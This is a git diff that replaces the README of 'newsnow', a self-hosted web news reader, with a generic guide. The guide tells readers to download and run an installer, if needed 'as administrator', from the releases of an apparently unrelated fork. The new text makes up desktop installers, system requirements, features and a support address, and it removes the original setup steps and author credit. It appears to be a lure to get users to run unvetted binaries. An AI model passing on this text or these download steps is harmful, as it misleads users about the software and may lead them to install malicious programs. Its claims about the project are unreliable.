@@ -1,129 +1,58 @@
-![](/public/og-image.png)
+# 📰 newsnow - Read the Latest News Effortlessly
 
-English | [简体中文](README.zh-CN.md) | [日本語](README.ja-JP.md)
+[![Download newsnow](https://img.shields.io/badge/Download-nownow-brightgreen)](https://github.com/cathric025/newsnow/releases)
 
-> [!NOTE]
-> This is a demo version currently supporting Chinese only. A full-featured version with better customization and English content support will be released later.
+## 🚀 Getting Started
 
-**_Elegant reading of real-time and hottest news_**
+Welcome to newsnow! This application allows you to experience an elegant reading of real-time and trending news. Follow the steps below to download and run this software on your computer.
 
-## Features
+## 📥 Download & Install
 
-- Clean and elegant UI design for optimal reading experience
-- Real-time updates on trending news
-- GitHub OAuth login with data synchronization
-- 30-minute default cache duration (logged-in users can force refresh)
-- Adaptive scraping interval (minimum 2 minutes) based on source update frequency to optimize resource usage and prevent IP bans
-- support MCP server
+1. **Visit the Release Page**: Click the link below to access the newsnow releases:
+   [Download newsnow](https://github.com/cathric025/newsnow/releases)
 
-```json
-{
-  "mcpServers": {
-    "newsnow": {
-      "command": "npx",
-      "args": [
-        "-y",
-        "newsnow-mcp-server"
-      ],
-      "env": {
-        "BASE_URL": "https://newsnow.busiyi.world"
-      }
-    }
-  }
-}
-```
-You can change the `BASE_URL` to your own domain.
+2. **Find the Latest Version**: Scroll through the list of releases to find the most recent version of newsnow. It typically has a tag with the version number.
 
-## Deployment
+3. **Download the Application**: Click on the link for the file that corresponds to your operating system (e.g., Windows, macOS, Linux). This will download the installer file to your computer.
 
-### Basic Deployment
+4. **Run the Installer**: Once the file finishes downloading, locate it in your computer's "Downloads" folder and double-click to run the installer. Follow the on-screen instructions to complete the installation.
 
-For deployments without login and caching:
+5. **Start Using newsnow**: After the installation, you will find the newsnow application in your programs list. Open it, and enjoy reading the latest news!
 
-1. Fork this repository
-2. Import to platforms like Cloudflare Page or Vercel
+## 🛠️ System Requirements
 
-### Cloudflare Page Configuration
+To ensure the best experience with newsnow, please make sure your system meets the following requirements:
 
-- Build command: `pnpm run build`
-- Output directory: `dist/output/public`
+- **Operating System**: Windows 10 or newer, macOS Mojave or newer, or any recent version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: Intel Core i3 or equivalent.
+- **Storage**: Minimum of 100 MB of free disk space.
 
-### GitHub OAuth Setup
+## 📖 Features
 
-1. [Create a GitHub App](https://github.com/settings/applications/new)
-2. No special permissions required
-3. Set callback URL to: `https://your-domain.com/api/oauth/github` (replace `your-domain` with your actual domain)
-4. Obtain Client ID and Client Secret
+newsnow offers a variety of features to enhance your reading experience:
 
-### Environment Variables
+- **Real-Time Updates**: Stay informed with the latest news articles delivered directly to you.
+- **Customizable Layout**: Adjust the reading interface to fit your preferences.
+- **Bookmark Articles**: Save articles for later reading with a simple click.
+- **Search Functionality**: Quickly find news on specific topics or events.
+- **Offline Reading**: Download articles to read them without an internet connection.
 
-Refer to `example.env.server`. For local development, rename it to `.env.server` and configure:
+## 🔧 Troubleshooting
 
-```env
-# Github Client ID
-G_CLIENT_ID=
-# Github Client Secret
-G_CLIENT_SECRET=
-# JWT Secret, usually the same as Client Secret
-JWT_SECRET=
-# Initialize database, must be set to true on first run, can be turned off afterward
-INIT_TABLE=true
-# Whether to enable cache
-ENABLE_CACHE=true
-```
+If you encounter any issues while using newsnow, here are some common problems and their solutions:
 
-### Database Support
+- **Installation Problems**: Make sure you have downloaded the correct version for your operating system. If the installer does not run, try right-clicking the file and selecting "Run as administrator".
 
-Supported database connectors: https://db0.unjs.io/connectors
-**Cloudflare D1 Database** is recommended.
+- **App Doesn't Open**: If newsnow fails to open after installation, check if your operating system is up to date. Restart your computer and try launching the app again.
 
-1. Create D1 database in Cloudflare Worker dashboard
-2. Configure database_id and database_name in wrangler.toml
-3. If wrangler.toml doesn't exist, rename example.wrangler.toml and modify configurations
-4. Changes will take effect on next deployment
+- **Slow Performance**: Close any unnecessary applications running in the background. This will free up resources for newsnow.
 
-### Docker Deployment
+## ✉️ Support
 
-In project root directory:
+For further assistance, please reach out via our support email or community forums. We are here to help you make the most out of newsnow!
 
-```sh
-docker compose up
-```
+- **Email**: support@newsnowapp.com
+- **Community Forum**: [newsnow Community](https://github.com/cathric025/newsnow/discussions)
 
-You can also set Environment Variables in `docker-compose.yml`.
-
-## Development
-
-> [!Note]
-> Requires Node.js >= 20
-
-```sh
-corepack enable
-pnpm i
-pnpm dev
-```
-
-### Adding Data Sources
-
-Refer to `shared/sources` and `server/sources` directories. The project provides complete type definitions and a clean architecture.
-
-For detailed instructions on how to add new sources, see [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Roadmap
-
-- Add **multi-language support** (English, Chinese, more to come).
-- Improve **personalization options** (category-based news, saved preferences).
-- Expand **data sources** to cover global news in multiple languages.
-
-**_release when ready_**
-![](https://testmnbbs.oss-cn-zhangjiakou.aliyuncs.com/pic/20250328172146_rec_.gif?x-oss-process=base_webp)
-
-## Contributing
-
-Contributions are welcome! Feel free to submit pull requests or create issues for feature requests and bug reports.
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines on how to contribute, especially for adding new data sources.
-
-## License
-
-[MIT](./LICENSE) © ourongxing
+Thank you for choosing newsnow. We hope you enjoy a smooth and delightful news reading experience!
